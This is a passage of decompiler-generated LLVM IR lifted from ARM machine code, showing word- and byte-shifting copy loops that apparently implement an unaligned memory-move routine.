  store i32 %v1_139f4, i32* %r2.global-to-local, align 4
  %v3_139f4 = sub i32 15, %v0_139f4
  %v4_139f4 = and i32 %v3_139f4, %v0_139f4
  %v5_139f4 = icmp slt i32 %v4_139f4, 0
  %v6_139f4 = icmp slt i32 %v1_139f4, 0
  %v2_139f8 = xor i1 %v6_139f4, %v5_139f4
  br i1 %v2_139f8, label %dec_label_pc_139fc, label %dec_label_pc_139cc.dec_label_pc_139cc_crit_edge

dec_label_pc_139cc.dec_label_pc_139cc_crit_edge:  ; preds = %dec_label_pc_139cc
  %v0_139cc.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_139d0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_139cc

dec_label_pc_139fc:                               ; preds = %dec_label_pc_139cc
  %v2_139fc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_139fc, i32* @r4, align 4
  %v5_139fc = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_139fc, i32* @r5, align 4
  %v1_13a00 = add i32 %v0_139f4, -4
  store i32 %v1_13a00, i32* %r2.global-to-local, align 4
  %v3_13a00 = add i32 %v0_139f4, 2147483632
  %v4_13a00 = and i32 %v1_13a00, %v3_13a00
  %v5_13a00 = icmp slt i32 %v4_13a00, 0
  store i1 %v5_13a00, i1* %cpsr_v.global-to-local, align 1
  %v6_13a00 = icmp slt i32 %v1_13a00, 0
  store i1 %v6_13a00, i1* %cpsr_n.global-to-local, align 1
  %v7_13a00 = icmp eq i32 %v1_13a00, 0
  store i1 %v7_13a00, i1* %cpsr_z.global-to-local, align 1
  %v2_13a04 = xor i1 %v6_13a00, %v5_13a00
  br i1 %v2_13a04, label %dec_label_pc_13a20, label %dec_label_pc_13a08

dec_label_pc_13a08:                               ; preds = %dec_label_pc_139fc, %dec_label_pc_139bc, %dec_label_pc_13a08
  %v1_13a14 = phi i32 [ %v4_13a14, %dec_label_pc_13a08 ], [ %v12_139f0, %dec_label_pc_139fc ], [ %v0_13a5c75, %dec_label_pc_139bc ]
  %v0_13a08 = load i32, i32* %lr.global-to-local, align 4
  %v3_13a08 = udiv i32 %v0_13a08, 65536
  store i32 %v3_13a08, i32* %ip.global-to-local, align 4
  %v0_13a0c = load i32, i32* %r1.global-to-local, align 4
  %v1_13a0c = inttoptr i32 %v0_13a0c to i32*
  %v2_13a0c = load i32, i32* %v1_13a0c, align 4
  store i32 %v2_13a0c, i32* %lr.global-to-local, align 4
  %v4_13a0c = add i32 %v0_13a0c, 4
  store i32 %v4_13a0c, i32* %r1.global-to-local, align 4
  %v4_13a10 = mul i32 %v2_13a0c, 65536
  %v5_13a10 = or i32 %v4_13a10, %v3_13a08
  store i32 %v5_13a10, i32* @ip, align 4
  %v2_13a14 = inttoptr i32 %v1_13a14 to i32*
  store i32 %v5_13a10, i32* %v2_13a14, align 4
  %v3_13a14 = load i32, i32* %r0.global-to-local, align 4
  %v4_13a14 = add i32 %v3_13a14, 4
  store i32 %v4_13a14, i32* %r0.global-to-local, align 4
  %v0_13a18 = load i32, i32* %r2.global-to-local, align 4
  %v1_13a18 = add i32 %v0_13a18, -4
  store i32 %v1_13a18, i32* %r2.global-to-local, align 4
  %v3_13a18 = sub i32 3, %v0_13a18
  %v4_13a18 = and i32 %v3_13a18, %v0_13a18
  %v5_13a18 = icmp slt i32 %v4_13a18, 0
  %v6_13a18 = icmp slt i32 %v1_13a18, 0
  %v2_13a1c = xor i1 %v6_13a18, %v5_13a18
  br i1 %v2_13a1c, label %dec_label_pc_13a20.loopexit, label %dec_label_pc_13a08

dec_label_pc_13a20.loopexit:                      ; preds = %dec_label_pc_13a08
  %v7_13a18 = icmp eq i32 %v0_13a18, 4
  store i1 %v5_13a18, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_13a18, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_13a18, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13a20

dec_label_pc_13a20:                               ; preds = %dec_label_pc_13a20.loopexit, %dec_label_pc_139fc
  %v0_138dc59 = phi i32 [ %v1_13a18, %dec_label_pc_13a20.loopexit ], [ %v1_13a00, %dec_label_pc_139fc ]
  %v0_13a20 = load i32, i32* %r1.global-to-local, align 4
  %v1_13a20 = add i32 %v0_13a20, -2
  store i32 %v1_13a20, i32* @r1, align 4
  br label %bb140

dec_label_pc_13a28:                               ; preds = %dec_label_pc_1393c
  br i1 %v2_139c0, label %dec_label_pc_13a74, label %dec_label_pc_13a30

dec_label_pc_13a30:                               ; preds = %dec_label_pc_13a28
  store i32 %v1_139bc, i32* %r2.global-to-local, align 4
  %v3_13a34 = load i32, i32* @r4, align 4
  store i32 %v3_13a34, i32* %stack_var_-16, align 4
  %v6_13a34 = load i32, i32* @r5, align 4
  store i32 %v6_13a34, i32* %stack_var_-12, align 4
  br label %dec_label_pc_13a38

dec_label_pc_13a38:                               ; preds = %dec_label_pc_13a38.dec_label_pc_13a38_crit_edge, %dec_label_pc_13a30
  %v0_13a5c = phi i32 [ %v12_13a5c, %dec_label_pc_13a38.dec_label_pc_13a38_crit_edge ], [ %v0_13a5c75, %dec_label_pc_13a30 ]
  %v0_13a3c = phi i32 [ %v0_13a3c.pre, %dec_label_pc_13a38.dec_label_pc_13a38_crit_edge ], [ %v4_13940, %dec_label_pc_13a30 ]
  %v0_13a38 = phi i32 [ %v0_13a38.pre, %dec_label_pc_13a38.dec_label_pc_13a38_crit_edge ], [ %v2_13940, %dec_label_pc_13a30 ]
  %v3_13a38 = udiv i32 %v0_13a38, 16777216
  %v1_13a3c = inttoptr i32 %v0_13a3c to i32*
  %v2_13a3c = load i32, i32* %v1_13a3c, align 4
  store i32 %v2_13a3c, i32* %r4.global-to-local, align 4
  %v3_13a3c = add i32 %v0_13a3c, 4
  %v4_13a3c = inttoptr i32 %v3_13a3c to i32*
  %v5_13a3c = load i32, i32* %v4_13a3c, align 4
  store i32 %v5_13a3c, i32* %r5.global-to-local, align 4
  %v6_13a3c = add i32 %v0_13a3c, 8
  %v7_13a3c = inttoptr i32 %v6_13a3c to i32*
  %v8_13a3c = load i32, i32* %v7_13a3c, align 4
  store i32 %v8_13a3c, i32* %ip.global-to-local, align 4
  %v9_13a3c = add i32 %v0_13a3c, 12
  %v10_13a3c = inttoptr i32 %v9_13a3c to i32*
  %v11_13a3c = load i32, i32* %v10_13a3c, align 4
  store i32 %v11_13a3c, i32* %lr.global-to-local, align 4
  %v12_13a3c = add i32 %v0_13a3c, 16
  store i32 %v12_13a3c, i32* %r1.global-to-local, align 4
  %v4_13a40 = mul i32 %v2_13a3c, 256
  %v5_13a40 = or i32 %v4_13a40, %v3_13a38
  store i32 %v5_13a40, i32* @r3, align 4
  %v3_13a44 = udiv i32 %v2_13a3c, 16777216
  %v4_13a48 = mul i32 %v5_13a3c, 256
  %v5_13a48 = or i32 %v4_13a48, %v3_13a44
  store i32 %v5_13a48, i32* %r4.global-to-local, align 4
  %v3_13a4c = udiv i32 %v5_13a3c, 16777216
  %v4_13a50 = mul i32 %v8_13a3c, 256
  %v5_13a50 = or i32 %v4_13a50, %v3_13a4c
  store i32 %v5_13a50, i32* %r5.global-to-local, align 4
  %v3_13a54 = udiv i32 %v8_13a3c, 16777216
  %v4_13a58 = mul i32 %v11_13a3c, 256
  %v5_13a58 = or i32 %v4_13a58, %v3_13a54
  store i32 %v5_13a58, i32* @ip, align 4
  %v1_13a5c = inttoptr i32 %v0_13a5c to i32*
  store i32 %v5_13a40, i32* %v1_13a5c, align 4
  %v3_13a5c = add i32 %v0_13a5c, 4
  %v4_13a5c = inttoptr i32 %v3_13a5c to i32*
  %v5_13a5c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_13a5c, i32* %v4_13a5c, align 4
  %v6_13a5c = add i32 %v0_13a5c, 8
  %v7_13a5c = inttoptr i32 %v6_13a5c to i32*
  %v8_13a5c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_13a5c, i32* %v7_13a5c, align 4
  %v9_13a5c = add i32 %v0_13a5c, 12
  %v10_13a5c = inttoptr i32 %v9_13a5c to i32*
  %v11_13a5c = load i32, i32* @ip, align 4
  store i32 %v11_13a5c, i32* %v10_13a5c, align 4
  %v12_13a5c = add i32 %v0_13a5c, 16
  store i32 %v12_13a5c, i32* %r0.global-to-local, align 4
  %v0_13a60 = load i32, i32* %r2.global-to-local, align 4
  %v1_13a60 = add i32 %v0_13a60, -16
  store i32 %v1_13a60, i32* %r2.global-to-local, align 4
  %v3_13a60 = sub i32 15, %v0_13a60
  %v4_13a60 = and i32 %v3_13a60, %v0_13a60
  %v5_13a60 = icmp slt i32 %v4_13a60, 0
  %v6_13a60 = icmp slt i32 %v1_13a60, 0
  %v2_13a64 = xor i1 %v6_13a60, %v5_13a60
  br i1 %v2_13a64, label %dec_label_pc_13a68, label %dec_label_pc_13a38.dec_label_pc_13a38_crit_edge

dec_label_pc_13a38.dec_label_pc_13a38_crit_edge:  ; preds = %dec_label_pc_13a38
  %v0_13a38.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_13a3c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13a38

dec_label_pc_13a68:                               ; preds = %dec_label_pc_13a38
  %v2_13a68 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13a68, i32* @r4, align 4
  %v5_13a68 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_13a68, i32* @r5, align 4
  %v1_13a6c = add i32 %v0_13a60, -4
  store i32 %v1_13a6c, i32* %r2.global-to-local, align 4
  %v3_13a6c = add i32 %v0_13a60, 2147483632
  %v4_13a6c = and i32 %v1_13a6c, %v3_13a6c
  %v5_13a6c = icmp slt i32 %v4_13a6c, 0
  store i1 %v5_13a6c, i1* %cpsr_v.global-to-local, align 1
  %v6_13a6c = icmp slt i32 %v1_13a6c, 0
  store i1 %v6_13a6c, i1* %cpsr_n.global-to-local, align 1
  %v7_13a6c = icmp eq i32 %v1_13a6c, 0
  store i1 %v7_13a6c, i1* %cpsr_z.global-to-local, align 1
  %v2_13a70 = xor i1 %v6_13a6c, %v5_13a6c
  br i1 %v2_13a70, label %dec_label_pc_13a8c, label %dec_label_pc_13a74

dec_label_pc_13a74:                               ; preds = %dec_label_pc_13a68, %dec_label_pc_13a28, %dec_label_pc_13a74
  %v1_13a80 = phi i32 [ %v4_13a80, %dec_label_pc_13a74 ], [ %v12_13a5c, %dec_label_pc_13a68 ], [ %v0_13a5c75, %dec_label_pc_13a28 ]
  %v0_13a74 = load i32, i32* %lr.global-to-local, align 4
  %v3_13a74 = udiv i32 %v0_13a74, 16777216
  store i32 %v3_13a74, i32* %ip.global-to-local, align 4
  %v0_13a78 = load i32, i32* %r1.global-to-local, align 4
  %v1_13a78 = inttoptr i32 %v0_13a78 to i32*
  %v2_13a78 = load i32, i32* %v1_13a78, align 4
  store i32 %v2_13a78, i32* %lr.global-to-local, align 4
  %v4_13a78 = add i32 %v0_13a78, 4
  store i32 %v4_13a78, i32* %r1.global-to-local, align 4
  %v4_13a7c = mul i32 %v2_13a78, 256
  %v5_13a7c = or i32 %v4_13a7c, %v3_13a74
  store i32 %v5_13a7c, i32* @ip, align 4
  %v2_13a80 = inttoptr i32 %v1_13a80 to i32*
  store i32 %v5_13a7c, i32* %v2_13a80, align 4
  %v3_13a80 = load i32, i32* %r0.global-to-local, align 4
  %v4_13a80 = add i32 %v3_13a80, 4
  store i32 %v4_13a80, i32* %r0.global-to-local, align 4
  %v0_13a84 = load i32, i32* %r2.global-to-local, align 4
  %v1_13a84 = add i32 %v0_13a84, -4
  store i32 %v1_13a84, i32* %r2.global-to-local, align 4
  %v3_13a84 = sub i32 3, %v0_13a84
  %v4_13a84 = and i32 %v3_13a84, %v0_13a84
  %v5_13a84 = icmp slt i32 %v4_13a84, 0
  %v6_13a84 = icmp slt i32 %v1_13a84, 0
  %v2_13a88 = xor i1 %v6_13a84, %v5_13a84
  br i1 %v2_13a88, label %dec_label_pc_13a8c.loopexit, label %dec_label_pc_13a74

dec_label_pc_13a8c.loopexit:                      ; preds = %dec_label_pc_13a74
  %v7_13a84 = icmp eq i32 %v0_13a84, 4
  store i1 %v5_13a84, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_13a84, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_13a84, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13a8c

dec_label_pc_13a8c:                               ; preds = %dec_label_pc_13a8c.loopexit, %dec_label_pc_13a68
  %v0_138dc60 = phi i32 [ %v1_13a84, %dec_label_pc_13a8c.loopexit ], [ %v1_13a6c, %dec_label_pc_13a68 ]
  %v0_13a8c = load i32, i32* %r1.global-to-local, align 4
  %v1_13a8c = add i32 %v0_13a8c, -1
  store i32 %v1_13a8c, i32* @r1, align 4
  br label %bb140

dec_label_pc_13a94:                               ; preds = %entry
  %v1_13a94 = load i32, i32* @r2, align 4
  %v2_13a94 = add i32 %v1_13a94, %v0_13840
  store i32 %v2_13a94, i32* @r1, align 4
  %v2_13a98 = add i32 %v1_13a94, %v1_13840
  store i32 %v2_13a98, i32* %r0.global-to-local, align 4
  %v2_13a9c = add i32 %v1_13a94, -4
  store i32 %v2_13a9c, i32* %r2.global-to-local, align 4
  %v4_13a9c = sub i32 3, %v1_13a94
  %v5_13a9c = and i32 %v4_13a9c, %v1_13a94
  %v6_13a9c = icmp slt i32 %v5_13a9c, 0
  store i1 %v6_13a9c, i1* %cpsr_v.global-to-local, align 1
  %v7_13a9c = icmp slt i32 %v2_13a9c, 0
  store i1 %v7_13a9c, i1* %cpsr_n.global-to-local, align 1
  %v8_13a9c = icmp eq i32 %v1_13a94, 4
  store i1 %v8_13a9c, i1* %cpsr_z.global-to-local, align 1
  %v5_13aa0 = icmp slt i32 %v1_13a94, 4
  br i1 %v5_13aa0, label %bb150, label %dec_label_pc_13aa4

dec_label_pc_13aa4:                               ; preds = %dec_label_pc_13a94
  %v1_13aa4 = urem i32 %v2_13a98, 4
  store i32 %v1_13aa4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_13aa4 = icmp eq i32 %v1_13aa4, 0
  store i1 %v2_13aa4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13aa4, label %dec_label_pc_13aac, label %dec_label_pc_13b4c

dec_label_pc_13aac:                               ; preds = %dec_label_pc_13aa4
  %v1_13aac = urem i32 %v2_13a94, 4
  store i32 %v1_13aac, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_13aac = icmp eq i32 %v1_13aac, 0
  store i1 %v2_13aac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13aac, label %dec_label_pc_13ab4, label %dec_label_pc_13b78

dec_label_pc_13ab4:                               ; preds = %dec_label_pc_13aac, %dec_label_pc_13b70
  %v0_13acc36 = phi i32 [ %v2_13a98, %dec_label_pc_13aac ], [ %v0_13bc019, %dec_label_pc_13b70 ]
  %v0_13ac835 = phi i32 [ %v2_13a94, %dec_label_pc_13aac ], [ %v0_13b70, %dec_label_pc_13b70 ]
  %v0_13ab4 = phi i32 [ %v2_13a9c, %dec_label_pc_13aac ], [ %v2_13b68, %dec_label_pc_13b70 ]
  %v2_13ab4 = add i32 %v0_13ab4, -8
  store i32 %v2_13ab4, i32* %r2.global-to-local, align 4
  %v4_13ab4 = sub i32 7, %v0_13ab4
  %v5_13ab4 = and i32 %v4_13ab4, %v0_13ab4
  %v6_13ab4 = icmp slt i32 %v5_13ab4, 0
  store i1 %v6_13ab4, i1* %cpsr_v.global-to-local, align 1
  %v7_13ab4 = icmp slt i32 %v2_13ab4, 0
  store i1 %v7_13ab4, i1* %cpsr_n.global-to-local, align 1
  %v8_13ab4 = icmp eq i32 %v0_13ab4, 8
  store i1 %v8_13ab4, i1* %cpsr_z.global-to-local, align 1
  %v5_13ab8 = icmp slt i32 %v0_13ab4, 8
  br i1 %v5_13ab8, label %dec_label_pc_13b04, label %dec_label_pc_13abc

dec_label_pc_13abc:                               ; preds = %dec_label_pc_13ab4
  %v3_13abc = load i32, i32* @r4, align 4
  %v5_13abc = inttoptr i32 %v3_13abc to i8*
  store i8* %v5_13abc, i8** %stack_var_-8, align 4
  %v8_13abc = load i32, i32* @lr, align 4
  %v2_13ac0 = add i32 %v0_13ab4, -28
  store i32 %v2_13ac0, i32* %r2.global-to-local, align 4
  %v4_13ac0 = sub i32 27, %v0_13ab4
  %v5_13ac0 = and i32 %v4_13ac0, %v2_13ab4
  %v6_13ac0 = icmp slt i32 %v5_13ac0, 0
  store i1 %v6_13ac0, i1* %cpsr_v.global-to-local, align 1
  %v7_13ac0 = icmp slt i32 %v2_13ac0, 0
  store i1 %v7_13ac0, i1* %cpsr_n.global-to-local, align 1
  %v8_13ac0 = icmp eq i32 %v2_13ab4, 20
  store i1 %v8_13ac0, i1* %cpsr_z.global-to-local, align 1
  %v5_13ac4 = icmp slt i32 %v2_13ab4, 20
  br i1 %v5_13ac4, label %dec_label_pc_13ae0, label %dec_label_pc_13ac8

dec_label_pc_13ac8:                               ; preds = %dec_label_pc_13abc, %dec_label_pc_13ac8.dec_label_pc_13ac8_crit_edge
  %v0_13acc = phi i32 [ %v1_13ad4, %dec_label_pc_13ac8.dec_label_pc_13ac8_crit_edge ], [ %v0_13acc36, %dec_label_pc_13abc ]
  %v0_13ac8 = phi i32 [ %v0_13ac8.pre, %dec_label_pc_13ac8.dec_label_pc_13ac8_crit_edge ], [ %v0_13ac835, %dec_label_pc_13abc ]
  %v1_13ac8 = add i32 %v0_13ac8, -4
  %v2_13ac8 = inttoptr i32 %v1_13ac8 to i32*
  %v3_13ac8 = load i32, i32* %v2_13ac8, align 4
  %v4_13ac8 = add i32 %v0_13ac8, -8
  %v5_13ac8 = inttoptr i32 %v4_13ac8 to i32*
  %v6_13ac8 = load i32, i32* %v5_13ac8, align 4
  store i32 %v6_13ac8, i32* %r4.global-to-local, align 4
  %v7_13ac8 = add i32 %v0_13ac8, -12
  %v8_13ac8 = inttoptr i32 %v7_13ac8 to i32*
  %v9_13ac8 = load i32, i32* %v8_13ac8, align 4
  store i32 %v9_13ac8, i32* %ip.global-to-local, align 4
  %v10_13ac8 = add i32 %v0_13ac8, -16
  %v11_13ac8 = inttoptr i32 %v10_13ac8 to i32*
  %v12_13ac8 = load i32, i32* %v11_13ac8, align 4
  store i32 %v12_13ac8, i32* %lr.global-to-local, align 4
  store i32 %v10_13ac8, i32* %r1.global-to-local, align 4
  %v1_13acc = add i32 %v0_13acc, -16
  %v2_13acc = inttoptr i32 %v1_13acc to i32*
  store i32 %v3_13ac8, i32* %v2_13acc, align 4
  %v4_13acc = add i32 %v0_13acc, -12
  %v5_13acc = inttoptr i32 %v4_13acc to i32*
  %v6_13acc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_13acc, i32* %v5_13acc, align 4
  %v7_13acc = add i32 %v0_13acc, -8
  %v8_13acc = inttoptr i32 %v7_13acc to i32*
  %v9_13acc = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_13acc, i32* %v8_13acc, align 4
  %v10_13acc = add i32 %v0_13acc, -4
  %v11_13acc = inttoptr i32 %v10_13acc to i32*
  %v12_13acc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_13acc, i32* %v11_13acc, align 4
  store i32 %v1_13acc, i32* %r0.global-to-local, align 4
  %v0_13ad0 = load i32, i32* %r1.global-to-local, align 4
  %v1_13ad0 = add i32 %v0_13ad0, -4
  %v2_13ad0 = inttoptr i32 %v1_13ad0 to i32*
  %v3_13ad0 = load i32, i32* %v2_13ad0, align 4
  store i32 %v3_13ad0, i32* @r3, align 4
  %v4_13ad0 = add i32 %v0_13ad0, -8
  %v5_13ad0 = inttoptr i32 %v4_13ad0 to i32*
  %v6_13ad0 = load i32, i32* %v5_13ad0, align 4
  store i32 %v6_13ad0, i32* %r4.global-to-local, align 4
  %v7_13ad0 = add i32 %v0_13ad0, -12
  %v8_13ad0 = inttoptr i32 %v7_13ad0 to i32*
  %v9_13ad0 = load i32, i32* %v8_13ad0, align 4
  store i32 %v9_13ad0, i32* @ip, align 4
  %v10_13ad0 = add i32 %v0_13ad0, -16
  %v11_13ad0 = inttoptr i32 %v10_13ad0 to i32*
  %v12_13ad0 = load i32, i32* %v11_13ad0, align 4
  store i32 %v12_13ad0, i32* %lr.global-to-local, align 4
  store i32 %v10_13ad0, i32* @r1, align 4
  %v1_13ad4 = add i32 %v0_13acc, -32
  %v2_13ad4 = inttoptr i32 %v1_13ad4 to i32*
  store i32 %v3_13ad0, i32* %v2_13ad4, align 4
  %v4_13ad4 = add i32 %v0_13acc, -28
  %v5_13ad4 = inttoptr i32 %v4_13ad4 to i32*
  %v6_13ad4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_13ad4, i32* %v5_13ad4, align 4
  %v7_13ad4 = add i32 %v0_13acc, -24
  %v8_13ad4 = inttoptr i32 %v7_13ad4 to i32*
  %v9_13ad4 = load i32, i32* @ip, align 4
  store i32 %v9_13ad4, i32* %v8_13ad4, align 4
  %v10_13ad4 = add i32 %v0_13acc, -20
  %v11_13ad4 = inttoptr i32 %v10_13ad4 to i32*
  %v12_13ad4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_13ad4, i32* %v11_13ad4, align 4
  store i32 %v1_13ad4, i32* %r0.global-to-local, align 4
  %v0_13ad8 = load i32, i32* %r2.global-to-local, align 4
  %v2_13ad8 = add i32 %v0_13ad8, -32
  store i32 %v2_13ad8, i32* %r2.global-to-local, align 4
  %v6_13adc = icmp slt i32 %v0_13ad8, 32
  br i1 %v6_13adc, label %dec_label_pc_13ae0.loopexit, label %dec_label_pc_13ac8.dec_label_pc_13ac8_crit_edge

dec_label_pc_13ac8.dec_label_pc_13ac8_crit_edge:  ; preds = %dec_label_pc_13ac8
  %v0_13ac8.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_13ac8

dec_label_pc_13ae0.loopexit:                      ; preds = %dec_label_pc_13ac8
  %v4_13ad8 = sub i32 31, %v0_13ad8
  %v5_13ad8 = and i32 %v4_13ad8, %v0_13ad8
  %v6_13ad8 = icmp slt i32 %v5_13ad8, 0
  %v7_13ad8 = icmp slt i32 %v2_13ad8, 0
  store i1 %v6_13ad8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_13ad8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13ae0

dec_label_pc_13ae0:                               ; preds = %dec_label_pc_13ae0.loopexit, %dec_label_pc_13abc
  %v6_13ae8 = phi i32 [ %v1_13ad4, %dec_label_pc_13ae0.loopexit ], [ %v0_13acc36, %dec_label_pc_13abc ]
  %v0_13af0.pr = phi i32 [ %v2_13ad8, %dec_label_pc_13ae0.loopexit ], [ %v2_13ac0, %dec_label_pc_13abc ]
  %v4_13ae0 = add i32 %v0_13af0.pr, 16
  %v6_13ae0 = sub i32 0, %v0_13af0.pr
  %v7_13ae0 = and i32 %v4_13ae0, %v6_13ae0
  %v8_13ae0 = icmp slt i32 %v7_13ae0, 0
  store i1 %v8_13ae0, i1* %cpsr_v.global-to-local, align 1
  %v9_13ae0 = icmp slt i32 %v4_13ae0, 0
  store i1 %v9_13ae0, i1* %cpsr_n.global-to-local, align 1
  %v10_13ae0 = icmp eq i32 %v4_13ae0, 0
  store i1 %v10_13ae0, i1* %cpsr_z.global-to-local, align 1
  %v5_13ae4 = icmp slt i32 %v0_13af0.pr, -16
  br i1 %v5_13ae4, label %.thread1, label %bb147

bb147:                                            ; preds = %dec_label_pc_13ae0
  %v6_13ae4 = load i32, i32* @r1, align 4
  %v7_13ae4 = add i32 %v6_13ae4, -4
  %v8_13ae4 = inttoptr i32 %v7_13ae4 to i32*
  %v9_13ae4 = load i32, i32* %v8_13ae4, align 4
  store i32 %v9_13ae4, i32* @r3, align 4
  %v10_13ae4 = add i32 %v6_13ae4, -8
  %v11_13ae4 = inttoptr i32 %v10_13ae4 to i32*
  %v12_13ae4 = load i32, i32* %v11_13ae4, align 4
  store i32 %v12_13ae4, i32* %r4.global-to-local, align 4
  %v13_13ae4 = add i32 %v6_13ae4, -12
  %v14_13ae4 = inttoptr i32 %v13_13ae4 to i32*
  %v15_13ae4 = load i32, i32* %v14_13ae4, align 4
  store i32 %v15_13ae4, i32* @ip, align 4
  %v16_13ae4 = add i32 %v6_13ae4, -16
  %v17_13ae4 = inttoptr i32 %v16_13ae4 to i32*
  %v18_13ae4 = load i32, i32* %v17_13ae4, align 4
  store i32 %v18_13ae4, i32* %lr.global-to-local, align 4
  store i32 %v16_13ae4, i32* @r1, align 4
  %v7_13ae8 = add i32 %v6_13ae8, -16
  %v8_13ae8 = inttoptr i32 %v7_13ae8 to i32*
  store i32 %v9_13ae4, i32* %v8_13ae8, align 4
  %v10_13ae8 = add i32 %v6_13ae8, -12
  %v11_13ae8 = inttoptr i32 %v10_13ae8 to i32*
  %v12_13ae8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_13ae8, i32* %v11_13ae8, align 4
  %v13_13ae8 = add i32 %v6_13ae8, -8
  %v14_13ae8 = inttoptr i32 %v13_13ae8 to i32*
  %v15_13ae8 = load i32, i32* @ip, align 4
  store i32 %v15_13ae8, i32* %v14_13ae8, align 4
  %v16_13ae8 = add i32 %v6_13ae8, -4
  %v17_13ae8 = inttoptr i32 %v16_13ae8 to i32*
  %v18_13ae8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_13ae8, i32* %v17_13ae8, align 4
  store i32 %v7_13ae8, i32* %r0.global-to-local, align 4
  %v6_13aec = load i32, i32* %r2.global-to-local, align 4
  %v7_13aec = add i32 %v6_13aec, -16
  store i32 %v7_13aec, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_13ae0, %bb147
  %v6_13af8 = phi i32 [ %v7_13ae8, %bb147 ], [ %v6_13ae8, %dec_label_pc_13ae0 ]
  %v0_13af0 = phi i32 [ %v7_13aec, %bb147 ], [ %v0_13af0.pr, %dec_label_pc_13ae0 ]
  %v4_13af0 = add i32 %v0_13af0, 20
  store i32 %v4_13af0, i32* %r2.global-to-local, align 4
  %v6_13af0 = sub i32 0, %v0_13af0
  %v7_13af0 = and i32 %v4_13af0, %v6_13af0
  %v8_13af0 = icmp slt i32 %v7_13af0, 0
  store i1 %v8_13af0, i1* %cpsr_v.global-to-local, align 1
  %v9_13af0 = icmp slt i32 %v4_13af0, 0
  store i1 %v9_13af0, i1* %cpsr_n.global-to-local, align 1
  %v10_13af0 = icmp eq i32 %v4_13af0, 0
  store i1 %v10_13af0, i1* %cpsr_z.global-to-local, align 1
  %v5_13af4 = icmp slt i32 %v0_13af0, -20
  br i1 %v5_13af4, label %.thread3, label %bb148

bb148:                                            ; preds = %.thread1
  %v6_13af4 = load i32, i32* @r1, align 4
  %v7_13af4 = add i32 %v6_13af4, -4
  %v8_13af4 = inttoptr i32 %v7_13af4 to i32*
  %v9_13af4 = load i32, i32* %v8_13af4, align 4
  store i32 %v9_13af4, i32* @r3, align 4
  %v10_13af4 = add i32 %v6_13af4, -8
  %v11_13af4 = inttoptr i32 %v10_13af4 to i32*
  %v12_13af4 = load i32, i32* %v11_13af4, align 4
  store i32 %v12_13af4, i32* @ip, align 4
  %v13_13af4 = add i32 %v6_13af4, -12
  %v14_13af4 = inttoptr i32 %v13_13af4 to i32*
  %v15_13af4 = load i32, i32* %v14_13af4, align 4
  store i32 %v15_13af4, i32* %lr.global-to-local, align 4
  store i32 %v13_13af4, i32* @r1, align 4
  %v7_13af8 = add i32 %v6_13af8, -12
  %v8_13af8 = inttoptr i32 %v7_13af8 to i32*
  store i32 %v9_13af4, i32* %v8_13af8, align 4
  %v10_13af8 = add i32 %v6_13af8, -8
  %v11_13af8 = inttoptr i32 %v10_13af8 to i32*
  %v12_13af8 = load i32, i32* @ip, align 4
  store i32 %v12_13af8, i32* %v11_13af8, align 4
  %v13_13af8 = add i32 %v6_13af8, -4
  %v14_13af8 = inttoptr i32 %v13_13af8 to i32*
  %v15_13af8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_13af8, i32* %v14_13af8, align 4
  store i32 %v7_13af8, i32* %r0.global-to-local, align 4
  %v6_13afc = load i32, i32* %r2.global-to-local, align 4
  %v7_13afc = add i32 %v6_13afc, -12
  store i32 %v7_13afc, i32* %r2.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %bb148
  %v6_13b1c44 = phi i32 [ %v6_13af8, %.thread1 ], [ %v7_13af8, %bb148 ]
  %v0_13b0442 = phi i32 [ %v4_13af0, %.thread1 ], [ %v7_13afc, %bb148 ]
  %v2_13b00 = load i8*, i8** %stack_var_-8, align 4
  %v3_13b00 = ptrtoint i8* %v2_13b00 to i32
  store i32 %v3_13b00, i32* @r4, align 4
  store i32 %v8_13abc, i32* @lr, align 4
  br label %dec_label_pc_13b04

dec_label_pc_13b04:                               ; preds = %dec_label_pc_13ab4, %.thread3
  %v7_13b14 = phi i32 [ %v0_13acc36, %dec_label_pc_13ab4 ], [ %v6_13b1c44, %.thread3 ]
  %v0_13b04 = phi i32 [ %v2_13ab4, %dec_label_pc_13ab4 ], [ %v0_13b0442, %.thread3 ]
  %v2_13b04 = add i32 %v0_13b04, 8
  store i32 %v2_13b04, i32* %r2.global-to-local, align 4
  %v4_13b04 = sub i32 0, %v0_13b04
  %v5_13b04 = and i32 %v2_13b04, %v4_13b04
  %v6_13b04 = icmp slt i32 %v5_13b04, 0
  store i1 %v6_13b04, i1* %cpsr_v.global-to-local, align 1
  %v7_13b04 = icmp slt i32 %v2_13b04, 0
